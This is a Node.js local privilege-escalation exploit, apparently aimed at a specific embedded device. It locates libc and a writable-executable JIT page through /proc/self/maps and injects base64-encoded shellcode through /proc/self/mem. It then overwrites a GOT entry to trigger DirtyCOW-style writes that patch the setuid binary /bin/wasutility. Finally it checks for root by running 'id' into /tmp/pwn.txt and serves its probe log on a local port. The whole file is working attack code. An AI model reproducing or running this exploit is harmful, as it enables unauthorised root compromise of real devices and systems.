(function() {
  'use strict';
  var fs   = require('fs');
  var http = require('http');
  var cp   = require('child_process');
  var PORT       = 8133;
  var PROBE      = '/home/owner/share/tmp/sdk_tools/tbprobe47h.txt';
  var PWN_FILE   = '/tmp/pwn.txt';
  var WAS_PATH   = '/bin/wasutility';
  var WAS_OFFSET = 0x7e4b;
  var NODE       = process.execPath;

  function w(s) { try { fs.appendFileSync(PROBE, s + '\n'); } catch(e) {} }
  try { fs.writeFileSync(PROBE, 'v47h:start\n'); } catch(e) {}
  w('node=' + NODE + ' ver=' + process.version);

  function serve(body) {
    fs.writeFileSync(PROBE, body);
    var srv = http.createServer(function(req, res) { res.end(body); });
    srv.listen(PORT, '127.0.0.1');
    srv.on('error', function() {});
    setInterval(function() {}, 60000);
  }

  // Exploit with 5x GOT overwrite+trigger to spawn 5 concurrent DirtyCOW child forks
  // DC_WAIT_MS increased to 60s
  var EXPLOIT_CODE = [
    "(function(){",
    "var fs=require('fs');",
    "var PROBE='/home/owner/share/tmp/sdk_tools/tbprobe47h.txt';",
    "var GOT_OFFSET=0x143014;",
    "var WAS_PATH='/bin/wasutility';",
    "var WAS_OFFSET=0x7e4b;",
    "var DC_WAIT_MS=60000;",
    "var FIRE_COUNT=5;",
    "var SC_B64='LenwT0/wAgcA3wAoPNAcTBxND/KyEE/wAgFP8AACT/AFBwDfBkYwRilGT/AA' +",
    "  'Ak/wEwcA34GwAJQwRmlGT/AEAk/wBAcA3wGwMEZP8AYHAN9P8AAAT/AgAU/w' +",
    "  'AwJP8CIDb/AABE/wAAUwtE/wwAcA3wKwvejwjwC/r/MAgK/zAIAAAAAAAAAA' +",
    "  'AA/yLBBP8AABT/AAAk/wBQcA34BGT/AAAEzy5HHA8gABT/ABAk/wAgNERk/w' +",
    "  'AAUwtE/wwAcA3wKwgUZARk/wBgcA3z+gT/ACAU/wAAJP8AUHAN+CRk/wAABP' +",
    "  '8AABwPIBAU/wAwJP8CIDb/AABE/wAAUwtE/wwAcA3wKwg0ZP8AAEwPIBBFxE' +",
    "  'QfYAcMDyBQAhRk/wAAJP8AADT/AABSC0T/B4BwDfAbAAKBTRSvIgFsDyBwZI' +",
    "  'Rkzy5HHA8gABT/AEAk/w3AcA3wE+89FP8AAAT/ABBwDfSvIgFsDyBwZH9ktl' +",
    "  'TURQRilGT/AAAk/wEwcA31BGHKFP8AECT/AEBwDfAT7v0U/wAAQQtA/yRgQQ' +",
    "  'tA/yPwQQtAakELQFoGlGT/AAAk/wCwcA30/wAgBP8AEHAN8vYmluL3dhc3V0' +",
    "  'aWxpdHkAL3Byb2Mvc2VsZi9tZW0ALWUAaWQgPiAvdG1wL3B3bi50eHQA4AAA' +",
    "  'vw==';",
    "function w(s){try{fs.appendFileSync(PROBE,'child:'+s+'\\n');}catch(e){}}",
    "w('start pid='+process.pid);",
    "var _warm=0; for(var _i=0;_i<200000;_i++){_warm+=_i;}",
    "var maps_str,libcBase=0,jitPage=0,jitSz=0;",
    "try{maps_str=fs.readFileSync('/proc/self/maps','utf8');}catch(e){w('FAIL:maps '+e.message);process.exit(1);}",
    "var rwxpLines=[];",
    "maps_str.split('\\n').forEach(function(line){",
    "  if(!libcBase&&line.indexOf('libc-')!==-1){var m=line.match(/^([0-9a-f]+)-/);if(m)libcBase=parseInt(m[1],16);}",
    "  var rwx=line.match(/^([0-9a-f]+)-([0-9a-f]+) rwxp/);",
    "  if(rwx){var sz=parseInt(rwx[2],16)-parseInt(rwx[1],16);if(sz>jitSz){jitSz=sz;jitPage=parseInt(rwx[1],16);}}",
    "});",
    "var gotAddr=libcBase+GOT_OFFSET;",
    "w('libc=0x'+libcBase.toString(16)+' jit=0x'+jitPage.toString(16)+' got=0x'+gotAddr.toString(16));",
    "if(!libcBase||!jitPage||jitSz<0x10){w('FAIL:no_addrs');process.exit(1);}",
    "var wasByte=-1; try{wasByte=fs.readFileSync(WAS_PATH)[WAS_OFFSET];}catch(e){}",
    "w('wasByte=0x'+(wasByte&0xff).toString(16));",
    "if(wasByte===0xe0){w('ALREADY_PATCHED');process.exit(0);}",
    "var memfd=fs.openSync('/proc/self/mem','r+');",
    "var ob=new Buffer(4); fs.readSync(memfd,ob,0,4,gotAddr);",
    "var origMalloc=ob.readUInt32LE(0);",
    "w('origMalloc=0x'+origMalloc.toString(16));",
    "var SC_BIN=new Buffer(SC_B64,'base64');",
    "SC_BIN[0x80]=(origMalloc>>>0)&0xff; SC_BIN[0x81]=(origMalloc>>>8)&0xff;",
    "SC_BIN[0x82]=(origMalloc>>>16)&0xff; SC_BIN[0x83]=(origMalloc>>>24)&0xff;",
    "SC_BIN[0x84]=(gotAddr>>>0)&0xff; SC_BIN[0x85]=(gotAddr>>>8)&0xff;",
    "SC_BIN[0x86]=(gotAddr>>>16)&0xff; SC_BIN[0x87]=(gotAddr>>>24)&0xff;",
    "var scAddr=jitPage+0x1000;",
    "fs.writeSync(memfd,SC_BIN,0,SC_BIN.length,scAddr);",
    "var thumbTarget=(scAddr+1)>>>0;",
    "var gBuf=new Buffer(4); gBuf.writeUInt32LE(thumbTarget,0);",
    "// Fire 5 times: re-overwrite GOT before each trigger to spawn 5 concurrent DC forks",
    "for(var _f=0;_f<FIRE_COUNT;_f++){",
    "  fs.writeSync(memfd,gBuf,0,4,gotAddr);",
    "  var _t=new Buffer(16);",
    "  w('trigger_'+_f+'_returned');",
    "}",
    "fs.closeSync(memfd);",
    "w('all_fired — waiting '+DC_WAIT_MS+'ms');",
    "setTimeout(function(){",
    "  var wasB2=-1; try{wasB2=fs.readFileSync(WAS_PATH)[WAS_OFFSET];}catch(e){}",
    "  w('wasByte_after=0x'+(wasB2&0xff).toString(16));",
    "  w('DONE'); process.exit(0);",
    "},DC_WAIT_MS);",
    "})();"
  ].join('\n');

  w('v47h:spawning node -e exploit (5x triggers, 60s wait)');
  cp.execFile(NODE, ['-e', EXPLOIT_CODE], {timeout: 90000}, function(err, stdout, stderr) {
    var code = err ? err.code : 0;
    w('v47h:child_done code=' + code);
    if (stderr) w('v47h:stderr=[' + stderr.slice(0, 300) + ']');

    var wasB = -1;
    try { wasB = fs.readFileSync(WAS_PATH)[WAS_OFFSET]; } catch(e) {}
    w('v47h:wasByte=0x' + (wasB & 0xff).toString(16));

    var pwn = '';
    try { pwn = fs.readFileSync(PWN_FILE, 'utf8').trim(); } catch(e) {}

    if (!pwn) {
      cp.exec(WAS_PATH + ' -e "id > ' + PWN_FILE + '"', {timeout: 8000}, function(e2) {
        try { pwn = fs.readFileSync(PWN_FILE, 'utf8').trim(); } catch(re) {}
        var body = fs.readFileSync(PROBE, 'utf8') +
          'v47h:exec_e=' + (e2 ? e2.code : 'ok') + ' pwn=[' + pwn + ']\n=== END ===\n';
        serve(body);
      });
    } else {
      serve(fs.readFileSync(PROBE, 'utf8') + 'v47h:pwn=[' + pwn + ']\n=== END ===\n');
    }
  });
})();
